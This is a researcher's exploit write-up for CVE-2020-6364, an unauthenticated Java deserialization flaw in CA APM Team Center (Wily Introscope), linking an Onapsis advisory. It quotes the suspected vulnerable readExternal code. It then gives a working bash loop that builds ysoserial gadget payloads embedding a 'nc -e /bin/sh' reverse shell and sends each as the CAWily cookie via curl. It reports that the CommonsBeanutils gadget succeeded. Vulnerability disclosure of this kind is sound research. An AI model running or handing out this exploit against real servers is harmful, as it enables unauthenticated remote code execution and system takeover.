# CVE-2020-6364
Remote code execution in CA APM Team Center (Wily Introscope).

[Original advisory](https://github.com/Onapsis/vulnerability_advisories/blob/main/2021/CVE-2020-6364/ONAPSIS-2021-0008-OS_Command_Injection_in_CA_Introscope_Enterprise_Manager.md)

A deserialization vulnerability in CA APM Team Center leads to unauthenticated remote code execution on the server.

When authenticating to the server a cookie is returned that starts with the infamous ```rO0``` string indicating a base64-encoded serialized object:
![](./cookie.png)

Although I haven't fully traced the problem statically, this probably is the vulnerable code:
```java
public class HttpRequestHeaderInfo implements Externalizable {
  public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {

    in.readInt();
    int numMapEntries = in.readInt();
    this.fRequestParameterMap = (numMapEntries == 0) ? Collections.EMPTY_MAP : new HashMap(numMapEntries);

    for (int i = 0; i < numMapEntries; i++) {
      this.fRequestParameterMap.put(in.readUTF(), in.readObject());
    }

    int numCookies = in.readInt();
    this.fCookies = (numCookies == 0) ? kNoCookies : new Cookie[numCookies];

    for (int j = 0; j < this.fCookies.length; j++) {
      this.fCookies[j] = new Cookie((String)in.readObject(), (String)in.readObject());
    }
  }
}
```

Notice that the parameter map and the cookie are deserialized using ```readObject()``` from the user input.

This is trivially exploited by identifying a suitable gadget in a for loop:
```bash
for gadget in AspectJWeaver BeanShell1 C3P0 Click1 Clojure CommonsBeanutils1 CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 CommonsCollections7 FileUpload1 Groovy1 Hibernate1 Hibernate2 JBossInterceptors1 JRMPClient JRMPListener JSON1 JavassistWeld1 Jdk7u21 Jython1 MozillaRhino1 MozillaRhino2 Myfaces1 Myfaces2 ROME Spring1 Spring2 URLDNS Vaadin1 Wicket1
do
    java -jar ./ysoserial-0.0.6-SNAPSHOT-all.jar $gadget "nc -e /bin/sh ..." | base64 -w0 > cookie
    payload=$(cat cookie)
    curl -s -k 'https://remoteserver/' -X POST -H "Cookie: CAWily=$payload"
done
```

The only payload that produced remote code execution for me was CommonsBeanutils. The embedded JAR is ```org.apache.commons_beanutils_1.9.2.1.jar``` and does indeed include a vulnerable gadget according to the [maven repository](https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils/1.9.2).

Thanks
======
Obligatory thanks to a special someone who had me double check the header.
